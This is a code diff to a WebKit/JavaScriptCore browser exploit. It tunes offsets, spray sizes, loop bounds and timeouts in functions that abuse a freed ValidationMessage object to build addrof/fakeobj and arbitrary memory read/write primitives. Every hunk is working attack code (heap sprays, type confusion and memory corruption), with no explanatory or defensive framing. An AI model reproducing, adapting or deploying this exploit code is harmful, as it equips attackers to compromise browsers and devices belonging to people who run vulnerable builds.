@@ -61,6 +61,8 @@ function setupRW() {
 			break;
 		}
 	}
+	if (g_relative_rw === null)
+		die("[!] Failed to setup a relative R/W primitive");
 
 	debug_log("[+] Setting up arbitrary R/W");
 
@@ -113,7 +115,7 @@ function setupRW() {
 	/* Set up addrof/fakeobj primitives */
 	g_ab_slave.leakme = 0x1337;
 	var bf = 0;
-	for(var i = 10; i >= 8; i--)
+	for(var i = 15; i >= 8; i--)
 		bf = 256 * bf + g_relative_rw[g_ab_index + i];
 	g_jsview_butterfly = new Int64(bf);
 	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
@@ -127,7 +129,7 @@ function setupRW() {
 
 	og_slave_addr = new int64(slave_addr.low32(), slave_addr.hi32());
 	var leak_master = addrof(master_b);
-	write64(leak_master.add(0x5), leak_slave.add(0x5));
+	write64(leak_master.add(0x10), leak_slave.add(0x10));
 	var prim = {
 		write8: function(addr, val) {
 			master_b[0] = addr.low;
@@ -172,7 +174,7 @@ function setupRW() {
 		},
 		leakval: function(val) {
 			g_ab_slave.leakme = val;
-			master_b[0] = g_jsview_butterfly.low32() - 0x5;
+			master_b[0] = g_jsview_butterfly.low32() - 0x10;
 			master_b[1] = g_jsview_butterfly.hi32();
 			var r = new int64(slave_b[0], slave_b[1]);
 			master_b[0] = og_slave_addr.low;
@@ -185,7 +187,7 @@ function setupRW() {
 }
 
 function read(addr, length) {
-	for (let i = 0; i < 12; i++)
+	for (let i = 0; i < 8; i++)
 		g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_VECTOR + i] = addr.byteAt(i);
 	let arr = [];
 	for (let i = 0; i < length; i++)
@@ -194,11 +196,11 @@ function read(addr, length) {
 }
 
 function read64(addr) {
-	return new Int64(read(addr, 12));
+	return new Int64(read(addr, 8));
 }
 
 function write(addr, data) {
-	for (let i = 0; i < 12; i++)
+	for (let i = 0; i < 8; i++)
 		g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_VECTOR + i] = addr.byteAt(i);
 	for (let i = 0; i < data.length; i++)
 		g_ab_slave[i] = data[i];
@@ -243,7 +245,7 @@ function confuseTargetObjRound2() {
 	if (findTargetObj() === false)
 		die("[!] Failed to reuse target obj.");
 
-	g_fake_validation_message[3] = g_jsview_leak.add(OFFSET_JSAB_VIEW_LENGTH + 4 - OFFSET_HTMLELEMENT_REFCOUNT).asDouble();
+	g_fake_validation_message[4] = g_jsview_leak.add(OFFSET_JSAB_VIEW_LENGTH + 5 - OFFSET_HTMLELEMENT_REFCOUNT).asDouble();
 
 	setTimeout(setupRW, 6000);
 }
@@ -271,7 +273,7 @@ function leakJSC() {
 
         var tmp_spray = {};
         for(var i = 0; i < 100000; i++)
-                tmp_spray['Z'.repeat(8 * 2 * 8 - 4 - LENGTH_STRINGIMPL) + (''+i).padStart(4, '0')] = 0x1337;
+                tmp_spray['Z'.repeat(8 * 2 * 8 - 5 - LENGTH_STRINGIMPL) + (''+i).padStart(5, '0')] = 0x1337;
 
 	let ab = new ArrayBuffer(LENGTH_ARRAYBUFFER);
 
@@ -356,7 +358,7 @@ function leakJSC() {
  */
 function confuseTargetObjRound1() {
 	/* Force allocation of StringImpl obj. beyond Timer address */
-	sprayStringImpl(SPRAY_STRINGIMPL, SPRAY_STRINGIMPL * 4);
+	sprayStringImpl(SPRAY_STRINGIMPL, SPRAY_STRINGIMPL * 2);
 
 	/* Checking for leaked data */
 	if (findTargetObj() === false)
@@ -364,7 +366,7 @@ function confuseTargetObjRound1() {
 
 	dumpTargetObj();
 
-	g_fake_validation_message[3] = g_timer_leak.add(LENGTH_TIMER * 8 + OFFSET_LENGTH_STRINGIMPL + 1 - OFFSET_ELEMENT_REFCOUNT).asDouble();
+	g_fake_validation_message[4] = g_timer_leak.add(LENGTH_TIMER * 8 + OFFSET_LENGTH_STRINGIMPL + 1 - OFFSET_ELEMENT_REFCOUNT).asDouble();
 
 	/*
 	 * The timeout must be > 5s because deleteBubbleTree is scheduled to run in
@@ -386,7 +388,7 @@ function reuseTargetObj() {
 	 * Free ValidationMessage neighboors.
 	 * SmallLine is freed -> SmallPage is cached
 	 */
-	for (let i = NB_FRAMES / 2 - 0x5; i < NB_FRAMES / 2 + 0x5; i++)
+	for (let i = NB_FRAMES / 2 - 0x10; i < NB_FRAMES / 2 + 0x10; i++)
 		g_frames[i].setAttribute("rows", ',');
 
 	/* Get back target object */
@@ -411,9 +413,9 @@ function reuseTargetObj() {
 		g_round += 1;
 		g_input = input3;
 
-		setTimeout(confuseTargetObjRound1, 5);
+		setTimeout(confuseTargetObjRound1, 10);
 	} else {
-		setTimeout(confuseTargetObjRound2, 5);
+		setTimeout(confuseTargetObjRound2, 10);
 	}
 }
 
@@ -429,9 +431,9 @@ function findTargetObj() {
 			debug_log("[+] Found fake ValidationMessage");
 
 			if (g_round === 2) {
-				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][3]);
-				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][6]);
-				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][7]);
+				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][2]);
+				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][4]);
+				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][5]);
 				g_round++;
 			}
 
@@ -496,7 +498,7 @@ function sprayHTMLTextArea() {
 /* StringImpl Spray */
 function sprayStringImpl(start, end) {
 	for (let i = start; i < end; i++) {
-		let s = new String("A".repeat(LENGTH_TIMER - LENGTH_STRINGIMPL - 5) + i.toString().padStart(4, "0"));
+		let s = new String("A".repeat(LENGTH_TIMER - LENGTH_STRINGIMPL - 5) + i.toString().padStart(5, "0"));
 		g_obj_str[s] = 0x1337;
 	}
 }
